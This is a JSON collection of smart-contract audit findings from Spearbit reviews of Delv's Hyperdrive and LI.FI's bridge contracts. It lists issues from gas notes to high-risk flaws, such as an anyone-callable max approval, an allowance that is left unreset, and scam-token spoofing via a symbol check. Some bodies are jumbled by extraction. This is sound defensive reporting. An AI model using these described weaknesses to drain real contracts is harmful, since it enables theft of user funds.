        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-March-2024.pdf",
        "body": "In calculateSharesDeltaGivenBondsDeltaDerivativeSafe, when rhs == ONE, the function will return with a failure value. However, for this edge case it can return 0 successfully.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "uint is more gas efficient for reentrancy guard-like variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-March-2024.pdf",
        "body": "The use of uint256 over booleans for state variables like NOT_ENTERED and ENTERED in reentrancy guards, as seen in OpenZeppelin ReentrancyGuard introduces gas optimizations. In the current code we have the next line: bool private isReceiveLocked = true; While booleans are more gas-efficient for storage, their manipulation incurs extra gas due to the need for read- modify-write operations on storage slots. The choice of uint256 values (1 for RECEIVE_UNLOCKED, 2 for RECEIVE_- LOCKED) minimizes these costs by utilizing full storage slots directly, also making initial deployment slightly more expensive but reducing gas costs for subsequent operations.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Inconsistency in named in returns",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-March-2024.pdf",
        "body": "Some variables are defined via a named returns, while some others are just returned as value. In some cases, it have a named One example is _prepareInitialize, a function that is marked as override. return value while in other cases a return 0 with no named return, and a note that is missing where return value variable is declared: // NOTE: Return zero since this yield source isn t payable. ",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Base tokens cannot be swept",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-March-2024.pdf",
        "body": "The Hyperdrive pool should only custody vault shares (deposited base tokens are converted to shares, base tokens withdrawn from the vault are paid out immediately). Any lingering base token balance of the contract is by mistake and sweep should therefore be able to transfer out these tokens.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "reth timelock",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-March-2024.pdf",
        "body": "rETH has a timelock for each user that performs a transfer. This is checked in _beforeTokenTransfer. The number of blocks that need to be pass is set at depositDelay, which is under admin control. The timelock is defined as follows: bytes32 key = keccak256(abi.encodePacked(\"user.deposit.block\", from)); uint256 lastDepositBlock = getUint(key); if (lastDepositBlock > 0) { // Ensure enough blocks have passed uint256 depositDelay = getUint(keccak256(abi.encodePacked(keccak256(\"dao.protocol.setting.network\"), \"network.reth.deposit.delay\"))); uint256 blocksPassed = block.number.sub(lastDepositBlock); require(blocksPassed > depositDelay, \"Not enough time has passed since deposit\"); // Clear the state as it deleteUint(key);  s no longer necessary to check this until another deposit is made ,! ,! } At the start of rETHs existence, it was set to approximately 19h (considering 12s per block). At the time of writing this issue, it is zero and it probably won't change. In the context of Delv, it doesn't look as an issue, as the transfer calls of reth are done by msg.sender. But in the case of _prepareInitialize, which in case of an issue like \"Tokens for deployment contribution can be stolen\" and the timelock enabled, may lead to a user not being able to transfer, transferFrom, burn by the amount of time given by the timelock. In case of any updates, it would be relevant to ensure msg.sender is the user and not a contract to avoid this timelock that creates a temporal DoS to other users.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "StETHBase::_depositWithBase functionality may fail due to stake limits",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-March-2024.pdf",
        "body": "The _depositWithBase function might encounter a temporary denial of service (DoS) due to Lido's staking rate limits, which cap the amount of ether that can be staked within the timeframe of a day. This limitation could prevent deposits during periods of high demand: Staking rate limits: In order to handle the staking surge in case of some unforeseen market condi- tions, the Lido protocol implemented staking rate limits aimed at reducing the surge's impact on the staking queue & Lidos socialized rewards distribution model. There is a sliding window limit that is parametrized with _maxStakingLimit and _stakeLimitIncreasePerBlock. This means it is only pos- sible to submit this much ether to the Lido staking contracts within a 24 hours timeframe. Currently, the daily staking limit is set at 150,000 ether. You can picture this as a health globe from Diablo 2 with a maximum of _maxStakingLimit and regenerating with a constant speed per block. When you deposit ether to the protocol, the level of health is reduced by its amount and the current limit becomes smaller and smaller. When it hits the ground, transaction gets reverted. To avoid that, you should check if getCurrentStakeLimit() >= amountToStake, and if it's not you can go with an alternative route. The staking rate limits are denominated in ether, thus, it makes no difference if the stake is being deposited for stETH or using the wstETH shortcut, the limits apply in both cases.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Using different code to perform the same action is less maintainable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-March-2024.pdf",
        "body": "There are some inconsistencies in conditional checks for the message vale to be non-zero. Some locations use != 0 (2) while others use > 0 (7). Although this is not an issue for unsigned integers, it is arder to filter and maintain as it requires an additional search pattern to find all instances, which is less maintainable.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Upgradeable tokens can break system assumptions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-March-2024.pdf",
        "body": "The integration with upgradeable token contracts introduces potential risks regarding unforeseen behavior in future iterations. Take for example EzEthToken which is an upgradeable token. While it is unlikely that a breaking change is introduced without prior notice (forexample, returning false on failure rather than reverting, which would break the usage of _ezETH.transferFrom in case of failure), it would be prudent to keep a close watch on its evolution to prevent any issues that could arise from future modifications.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Parameter visibility does not follow a general pattern",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-March-2024.pdf",
        "body": " RETHHyperdriveDeployerCoordinator.sol#L24: rocketTokenReth is not public whereas the similar parame- ters are declared public.  LsETHHyperdriveDeployerCoordinator.sol#L20, LsETHHyperdriveCoreDeployer.sol#L17, LsETHTarget0Deployer.sol#L17, LsETHTarget2Deployer.sol#L17, LsETHTarget1Deployer.sol#L17, LsETHTarget3Deployer.sol#L17, LsETHTarget4Deployer.sol#L17: river is an internal parameter in these contexts whereas for the other liquidity sources the similar parameter is made public.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational RETHHyperdriveDeployerCoordinator.sol#L24,"
        ]
    },
    {
        "title": "Unused dependencies add unnecessary complexity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-March-2024.pdf",
        "body": "Unused imports and instances, such as ERC20, IERC20, FixedPointMath or ONE have being found in various parts of the codebase, leading to unnecessary complexity.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational EzETHTarget1Deployer.sol#L4, EzETHHyperdriveCoreDeployer.sol#L4, EzETHHyperdriveDeployerCoordinator.sol#L8,"
        ]
    },
    {
        "title": "Documentation / Comment issues",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-March-2024.pdf",
        "body": "See below:  LPMath.sol#L937: y_max_out(dz) ! z_max_out(dz)  RETHHyperdriveDeployerCoordinator.sol#L115-L117: The comment mentions 1e15 whereas the implemen- tation uses 1e16. Make sure either the comment or the code is updated to match one another.  EzETHHyperdriveDeployerCoordinator#L84: The comment mentions is payable but reverts on value at- tached, should be /// @dev We override the message value check since this integration is not payable.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Deployer initial vault share price implementation differs from instance implementation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-March-2024.pdf",
        "body": "There are two vault share price computations. One is implemented in the deployer contracts and is only used for the deployment, the other is implemented in the actual instances. These implementations often differ.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "The dependency graph can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-March-2024.pdf",
        "body": "The current dependency graph for the hyperdrive, target contracts and the internal contracts is the following: 15",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Informational"
        ]
    },
    {
        "title": "Receiver doesn't always reset allowance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function _swapAndCompleteBridgeTokens() of Receiver reset the approval to the executor at the end of an ERC20 transfer. However it there is insufficient gas then the approval is not reset. This allows the executor to access any tokens (of the same type) left in the Receiver. function _swapAndCompleteBridgeTokens(...) ... { ... if (LibAsset.isNativeAsset(assetId)) { ... } else { // case 2: ERC20 asset ... token.safeIncreaseAllowance(address(executor), amount); if (reserveRecoverGas && gasleft() < _recoverGas) { token.safeTransfer(receiver, amount); ... return; // no safeApprove 0 } try executor.swapAndCompleteBridgeTokens{...} ... token.safeApprove(address(executor), 0); } }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: High Risk"
        ]
    },
    {
        "title": "CelerIMFacet incorrectly sets RelayerCelerIM as receiver",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "When assigning a bytes memory variable to a new variable, the new variable points to the same memory location. Changing any one variable updates the other variable. Here is a PoC as a foundry test function testCopy() public { Pp memory x = Pp({ a: 2, b: address(2) }); Pp memory y = x; y.b = address(1); assertEq(x.b, y.b); } Thus, when CelerIMFacet._startBridge() updates bridgeDataAdjusted.receiver, _bridgeData.receiver is implicitly updated too. This makes the receiver on the destination chain to be the relayer address. // case 'yes': bridge + dest call - send to relayer ILiFi.BridgeData memory bridgeDataAdjusted = _bridgeData; bridgeDataAdjusted.receiver = address(relayer); (bytes32 transferId, address bridgeAddress) = relayer .sendTokenTransfer{ value: msgValue }(bridgeDataAdjusted, _celerIMData); // call message bus via relayer incl messageBusFee relayer.forwardSendMessageWithTransfer{value: _celerIMData.messageBusFee}( _bridgeData.receiver, uint64(_bridgeData.destinationChainId), bridgeAddress, transferId, _celerIMData.callData );",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Max approval to any address is possible",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "HopFacetOptimized.setApprovalForBridges() can be called by anyone to give max approval to any address for any ERC20 token. Any ERC20 token left in the Diamond can be stolen. function setApprovalForBridges(address[] calldata bridges,address[] calldata tokensToApprove) external { ... LibAsset.maxApproveERC20(..., type(uint256).max); ... }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Return value of low-level .call() not checked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "Low-level primitive .call() doesn't revert in caller's context when the callee reverts. value is not checked, it can lead the caller to falsely believe that the call was successful. Receiver.sol uses .call() to transfer the native token to receiver. If receiver reverts, this can lead to locked ETH in Receiver contract.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Limits in LIFuelFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The facet LIFuelFacet is meant for small amounts, however, it doesn't have any limits on the funds sent. This might result in funds getting stuck due to insufficient liquidity on the receiving side. function _startBridge(...) ... { ... if (LibAsset.isNativeAsset(_bridgeData.sendingAssetId)) { serviceFeeCollector.collectNativeGasFees{...}(...); } else { LibAsset.maxApproveERC20(...); serviceFeeCollector.collectTokenGasFees(...); ... } }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "The optimal version _depositAndSwap() isn't always used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function _depositAndSwap() of SwapperV2 has two versions. The second version keeps _- nativeReserve that is meant for fees. Several facets don't use this version although their bridge does require native fees. This could result in calls reverting due to insufficient native tokens left. function _depositAndSwap(...) ... // 4 parameter version /// @param _nativeReserve Amount of native token to prevent from being swept back to the caller function _depositAndSwap(..., uint256 _nativeReserve) ... // 5 parameter version",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "setContractOwner() is insufficient to lock down the owner",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function transferOwnershipToZeroAddress() is meant to make the Diamond immutable. It sets the contract owner to 0. However, the contract owner can still be changed if there happens to be a pendingOwner. In that case confirmOwnershipTransfer() can still change the contract owner. function transferOwnershipToZeroAddress() external { // transfer ownership to 0 address LibDiamond.setContractOwner(address(0)); } function setContractOwner(address _newOwner) internal { DiamondStorage storage ds = diamondStorage(); address previousOwner = ds.contractOwner; ds.contractOwner = _newOwner; emit OwnershipTransferred(previousOwner, _newOwner); } function confirmOwnershipTransfer() external { Storage storage s = getStorage(); address _pendingOwner = s.newOwner; if (msg.sender != _pendingOwner) revert NotPendingOwner(); emit OwnershipTransferred(LibDiamond.contractOwner(), _pendingOwner); LibDiamond.setContractOwner(_pendingOwner); s.newOwner = LibAsset.NULL_ADDRESS; }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Receiver does not verify address from the originator chain",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The Receiver contract is designed to receive the cross-chain call from libDiamond address on the destination chain. However, it does not verify the source chain address. An attacker can build a malicious _- callData. An attacker can steal funds if there are left tokens and there are allowances to the Executor. Note that the tokens may be lost in issue: \"Arithemetic underflow leading to unexpected revert and loss of funds in Receiver contract\". And there may be allowances to Executor in issue \"Receiver doesn't always reset allowance\"",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Arithemetic underflow leading to unexpected revert and loss of funds in Receiver contract.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The Receiver contract is designed to gracefully return the funds to users. It reserves the gas for recovering gas before doing swaps via executor.swapAndCompleteBridgeTokens. The logic of reserving gas for recovering funds is implemented at Receiver.sol#L236-L258 contract Receiver is ILiFi, ReentrancyGuard, TransferrableOwnership { // ... if (reserveRecoverGas && gasleft() < _recoverGas) { // case 1a: not enough gas left to execute calls receiver.call{ value: amount }(\"\"); // ... } // case 1b: enough gas left to execute calls try executor.swapAndCompleteBridgeTokens{ value: amount, gas: gasleft() - _recoverGas }(_transactionId, _swapData, assetId, receiver) {} catch { receiver.call{ value: amount }(\"\"); } // ... } 10 The gasleft() returns the remaining gas of a call. It is continuously decreasing. The second query of gasleft() is smaller than the first query. Hence, if the attacker tries to relay the transaction with a carefully crafted gas where gasleft() >= _recoverGas at the first quiry and gasleft() - _recoverGas reverts. This results in the token loss in the Receiver contract.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Use of name to identify a token",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "startBridgeTokensViaCelerIM() uses the token name to identify cfUSDC token. Another token with the same name can pass this check. An attacker can create a scam token with the name \"cfUSDC\" and a function canonical() returning a legit ERC20 token address, say WETH. If this token is passed as _bridge- Data.sendingAssetId, CelerIMFacet will transfer WETH. 11 if ( keccak256( abi.encodePacked( ERC20(_bridgeData.sendingAssetId).symbol() ) ) == keccak256(abi.encodePacked((\"cfUSDC\"))) ) { // special case for cfUSDC token asset = IERC20( CelerToken(_bridgeData.sendingAssetId).canonical() ); }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Unvalidated destination address in Gravity faucet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "Data.destinationAddress address. The code does not validate if the provided destination address is in the valid bech32 format. there is an issue related to the validation of In the Gravity faucet, This can potentially cause issues when sending tokens to the destination address. If the provided address is not in the bech32 format, the tokens can be locked. Also, it can lead to confusion for the end-users as they might enter an invalid address and lose their tokens without any warning or error message. it is recommended to add a validation check for the _gravity-",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Hardcode or whitelist the Thorswap vault address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The issue with this code is that the depositWithExpiry function allows the user to enter any arbitrary vault address, which could potentially lead to a loss of tokens. If a user enters an incorrect or non-existent vault address, the tokens could be lost forever. There should be some validation on the vault address to ensure that it is a valid and trusted address before allowing deposits to be made to it.  Router 12 // Deposit an asset with a memo. ETH is forwarded, ERC-20 stays in ROUTER function deposit(address payable vault, address asset, uint amount, string memory memo) public payable nonReentrant{ ,! uint safeAmount; if(asset == address(0)){ safeAmount = msg.value; bool success = vault.send(safeAmount); require(success); } else { require(msg.value == 0, \"THORChain_Router: unexpected eth\"); // protect user from ,! accidentally locking up eth if(asset == RUNE) { safeAmount = amount; iRUNE(RUNE).transferTo(address(this), amount); iERC20(RUNE).burn(amount); } else { safeAmount = safeTransferFrom(asset, amount); // Transfer asset _vaultAllowance[vault][asset] += safeAmount; // Credit to chosen vault } } emit Deposit(vault, asset, safeAmount, memo); }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Check enough native assets for fee",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function _startBridge() of SquidFacet adds _squidData.fee to _bridgeData.minAmount. It has verified there is enough native asset for _bridgeData.minAmount, but not for _squidData.fee. So this could use native assets present in the Diamond, although there normally shouldn't be any native assets left. A similar issue occurs in:  CelerIMFacet  DeBridgeFacet function _startBridge(...) ... { ... uint256 msgValue = _squidData.fee; if (LibAsset.isNativeAsset(address(sendingAssetId))) { msgValue += _bridgeData.minAmount; } ... ... squidRouter.bridgeCall{ value: msgValue }(...); ... }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "No check on native assets",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The functions startBridgeTokensViaHopL1Native() , startBridgeTokensViaXDaiBridge() and startBridgeTokensViaMultichain() don't check _bridgeData.minAmount <= msg.value. So this could use na- tive assets that are still in the Diamond, although that normally shouldn't happen. This might be an issue in combination with reentrancy. function startBridgeTokensViaHopL1Native(...) ... { _hopData.hopBridge.sendToL2{ value: _bridgeData.minAmount }( ... ); ... } function startBridgeTokensViaXDaiBridge(...) ... { _startBridge(_bridgeData); } function startBridgeTokensViaMultichain(...) ... { if (!LibAsset.isNativeAsset(_bridgeData.sendingAssetId)) LibAsset.depositAsset(_bridgeData.sendingAssetId,_bridgeData.minAmount); } // no check for native assets _startBridge(_bridgeData, _multichainData); }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing doesNotContainDestinationCalls()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The functions startBridgeTokensViaLIFuel() and swapAndStartBridgeTokensViaLIFuel() doesn't have doesNotContainDestinationCalls(). function startBridgeTokensViaLIFuel(...) external payable nonReentrant refundExcessNative(payable(msg.sender)) doesNotContainSourceSwaps(_bridgeData) validateBridgeData(_bridgeData) { ... }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Race condition in _startBridge of LIFuelFacet.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "If the mapping for FEE_COLLECTOR_NAME hasn't been set up yet, then serviceFeeCollector will be address(0) in function _startBridge of LIFuelFacet. This might give unexpected results. function _startBridge(...) ... ( ... ServiceFeeCollector serviceFeeCollector = ServiceFeeCollector( LibMappings.getPeripheryRegistryMappings().contracts[FEE_COLLECTOR_NAME] ); ... } function getPeripheryContract(string calldata _name) external view returns (address) { return LibMappings.getPeripheryRegistryMappings().contracts[_name]; }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Sweep tokens from Hopfacets",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The Hop bridges HopFacet and HopFacetOptimized don't check that _bridgeData.sendingAssetId is the same as the bridge token. So this could be used to sweep tokens out of the Diamond contract. Normally there shouldn't be any tokens left at the Diamond, however, in this version there are small amounts left: Etherscan LiFiDiamond.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing emit in _swapAndCompleteBridgeTokens of Receiver",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "In function _swapAndCompleteBridgeTokens the catch of ERC20 tokens does an emit, while the comparable catch of native assets doesn't do an emit. function _swapAndCompleteBridgeTokens(...) ... { ... if (LibAsset.isNativeAsset(assetId)) { .. try ... {} catch { receiver.call{ value: amount }(\"\"); // no emit } ... } else { // case 2: ERC20 asset ... try ... {} catch { token.safeTransfer(receiver, amount); emit LiFiTransferRecovered(...); } } }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Spam events in ServiceFeeCollector",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The contract ServiceFeeCollector has several functions that collect fees and are permissionless. This could result in spam events, which might confuse the processing of the events. function collectTokenGasFees(...) ... { ... emit GasFeesCollected(tokenAddress, receiver, feeAmount); } function collectNativeGasFees(...) ... { ... emit GasFeesCollected(LibAsset.NULL_ADDRESS, receiver, feeAmount); } function collectTokenInsuranceFees(...) ... { ... emit InsuranceFeesCollected(tokenAddress, receiver, feeAmount); } function collectNativeInsuranceFees(...) ... { ... emit InsuranceFeesCollected(LibAsset.NULL_ADDRESS,receiver,feeAmount); }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Function depositAsset() allows 0 amount of native assets",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function depositAsset() disallows amount == 0 for ERC20, however it does allow amount == 0 for native assets. function depositAsset(address assetId, uint256 amount) internal { if (isNativeAsset(assetId)) { if (msg.value < amount) revert InvalidAmount(); } else { if (amount == 0) revert InvalidAmount(); ... } }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Inadequate expiration time check in ThorSwapFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "According to Thorchain, the expiration time for certain operations should be set to +60 minutes. How- ever, there is currently no check in place to enforce this requirement. This oversight may lead to users inadvertently setting incorrect expiration times, potentially causing unexpected behavior or issues within the ThorSwapFacet.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Insufficient validation of bridgedTokenSymbol and sendingAssetId",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "During the code review, It has been noticed that the facet does not adequately check the corre- spondence between the bridgedTokenSymbol and sendingAssetId parameters. This oversight could allow for a random token to be sent to the Diamond, while still bridging another available token within the Diamond, even when no tokens should typically be left in the Diamond.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Check for destinationChainId in CBridgeFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "Function _startBridge() of CBridgeFacet contains a check on destinationChainId and contains conversions to uint64. If both block.chainid and _bridgeData.destinationChainId) fit in an uint64 then the checks of modifier val- idateBridgeData are already sufficient. When _bridgeData.destinationChainId > type(uint64).max then this never reverts: if (uint64(block.chainid) == _bridgeData.destinationChainId) revert CannotBridgeToSameNetwork(); Then in the rest of the code it takes the truncated varion of the destinationChainId via uint64(_bridge- Data.destinationChainId), which can be any value, including block.chainid. So you can still bridge to the same chain. function _startBridge(ILiFi.BridgeData memory _bridgeData,CBridgeData memory _cBridgeData) private { if (uint64(block.chainid) == _bridgeData.destinationChainId) revert CannotBridgeToSameNetwork(); if (...) { cBridge.sendNative{ value: _bridgeData.minAmount }(... , ,! uint64(_bridgeData.destinationChainId),...); } else { ... cBridge.send(..., uint64(_bridgeData.destinationChainId), ...); } } modifier validateBridgeData(ILiFi.BridgeData memory _bridgeData) { ... if (_bridgeData.destinationChainId == block.chainid) { revert CannotBridgeToSameNetwork(); } ... }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Absence of nonReentrant in HopFacetOptimized facet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "HopFacetOptimized is a facet-based smart contract implementation that aims to optimize gas usage and streamline the execution of certain functions. It doesn't have the checks that other facets have: nonReentrant refundExcessNative(payable(msg.sender)) containsSourceSwaps(_bridgeData) doesNotContainDestinationCalls(_bridgeData) validateBridgeData(_bridgeData) Most missing checks are done on purpose to save gas. However, the most important check is the nonReentrant modifier. On several places in the Diamond it is possible to trigger a reentrant call, for example via ERC777 18 tokens, custom tokens, native tokens transfers. In combination with the complexity of the code and the power of ERC20Proxy.sol it is difficult to make sure no attacks can occur.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Revert for excessive approvals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "Certain tokens, such as UNI and COMP, undergo a reversal if the value input for approval or transfer surpasses uint96. Both aforementioned tokens possess unique logic in their approval process that sets the allowance to the maximum value of uint96 when the approval amount equals uint256(-1). Note: Hop currently doesn't support these token so set to low risk.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Inconsistent transaction failure/stuck due to missing validation of global fixed native fee rate and execution fee",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The current implementation of the facet logic does not validate the global fixed native fee rate and execution fee, which can lead to inconsistent transaction failures or getting stuck in the process. This issue can arise when the fee rate is not set correctly or there are discrepancies between the fee rate used in the smart contract and the actual fee rate. This can result in transactions getting rejected or stuck, causing inconvenience to users and affecting the overall user experience.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Incorrect value emitted",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "LibSwap.swap() emits the following emit AssetSwapped( transactionId, _swap.callTo, _swap.sendingAssetId, _swap.receivingAssetId, _swap.fromAmount, newBalance > initialReceivingAssetBalance // toAmount ? newBalance - initialReceivingAssetBalance : newBalance, block.timestamp ); It will be difficult to interpret the value emitted for toAmount as the observer won't know which of the two values has been emitted.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Storage slots derived from hashes are prone to pre-image attacks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "Storage slots manually constructed using keccak hash of a string are prone to storage slot collision as the pre-images of these hashes are known. Attackers may find a potential path to those storage slots using the keccak hash function in the codebase and some crafted payload.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Incorrect arguments compared in SquidFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "startBridgeTokensViaSquid () reverts if (_squidData.sourceCalls.length > 0) != _bridge- Data.hasSourceSwaps. Here, _squidData.sourceCalls is an argument passed to Squid Router, and _bridge- Data.hasSourceSwaps refers to source swaps done by SquidFacet. Ideally, _bridgeData.hasSourceSwaps should be false for this function (though it's not enforced) which means _squidData.sourceCalls.length has to be 0 for it to successfully execute.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Unsafe casting of bridge amount from uint256 to uint128",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
